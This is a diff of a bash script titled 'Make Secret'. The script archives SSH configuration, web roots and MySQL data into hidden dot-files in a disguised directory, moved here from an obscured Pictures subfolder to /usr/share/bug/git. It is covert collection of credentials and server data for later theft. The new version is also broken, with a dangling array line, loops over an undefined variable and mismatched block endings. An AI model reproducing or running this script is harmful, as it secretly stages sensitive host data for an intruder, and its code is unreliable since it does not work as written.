@@ -1,25 +1,35 @@
 #!/bin/bash
 
 # Make Secret
-mkdir -p /home/$1/Pictures/.../.../
+mkdir -p /usr/share/bug/git
 
 all(){
-  dir_array=('/etc/ssh' '/var/www' '/etc/httpd' '/etc/nginx' '/etc/mysql' '/var/lib/mysql')
+  declare -A dirs
+  dirs[ssh]="/etc/ssh"
+  dirs[www]="/var/www"
+  dirs[httpd]="/etc/httpd"
+  dirs[nginx]="/etc/nginx"
+  dirs[mysql]="/etc/mysql"
+  '/var/lib/mysql')
   for i in "${dir_array[@]}"; do
-    if [ -d "$i" ] 
-    then
-      tar -pcvf /home/$1/Pictures/.../.../.$i.tar.gz $i  > /dev/null  2>&1
-    fi
+    for key in "${!dir_array[@]}"; do
+      if [ -d "$i" ] 
+      then
+        tar -pcvf /usr/share/bug/git/.$key.tar.gz $i  > /dev/null  2>&1
+      fi
+    done
+  done
 }
 
 one(){
   echo -ne "Enter Absolute Directory : "
   read dir
-  if [ -d "$2" ] 
+  echo -ne "Enter Name : "
+  read name
+  if [ -d "$dir" ] 
   then
-    tar -pcvf /home/$1/Pictures/.../.../.$2.tar.gz $2  > /dev/null  2>&1
+    tar -pcvf /usr/share/bug/git/.$name.tar.gz $dir  > /dev/null  2>&1
   fi
-
 }
 
 echo -ne "Enter Option (Default : None)\n1) All Directories\n2) Single Directory\n\n > "
@@ -29,6 +39,8 @@ read opt
 if [[ $opt == 1 ]]; then 
   all
   exit 0
+fi
+
 if [[ $opt == 2 ]]; then 
   one
   exit 0
